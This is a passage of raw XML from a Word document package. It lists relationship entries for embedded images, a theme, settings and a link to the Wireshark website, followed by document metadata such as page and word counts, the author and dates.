Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image74.png"/><Relationship Id="rId102" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image96.png"/><Relationship Id="rId123" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/><Relationship Id="rId90" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image84.png"/><Relationship Id="rId95" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image89.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6.png"/><Relationship Id="rId118" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image111.png"/><Relationship Id="rId80" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image75.png"/><Relationship Id="rId85" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image80.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7.png"/><Relationship Id="rId108" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image102.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5.png"/><Relationship Id="rId96" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image90.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7.png"/><Relationship Id="rId119" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image112.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4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/><Relationship Id="rId9"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3.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1.png"/><Relationship Id="rId104" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image98.png"/><Relationship Id="rId120" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image113.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6.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4.png"/><Relationship Id="rId115" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image108.png"/><Relationship Id="rId61" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image56.png"/><Relationship Id="rId82" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image77.png"/><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4.png"/><Relationship Id="rId105" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image99.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7.png"/><Relationship Id="rId98" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image92.png"/><Relationship Id="rId121" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image114.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09.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hyperlink" Target="https://www.wireshark.org/" TargetMode="External"/><Relationship Id="rId111" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image105.png"/><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0.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8.png"/><Relationship Id="rId99" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image93.png"/><Relationship Id="rId101" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image95.pn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100</Pages>
  <Words>7497</Words>
  <Characters>42738</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>356</Lines>
  <Paragraphs>100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50135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Aparna K A</cp:lastModifiedBy>
  <cp:revision>7</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-10-16T03:46:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-16T04:00:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>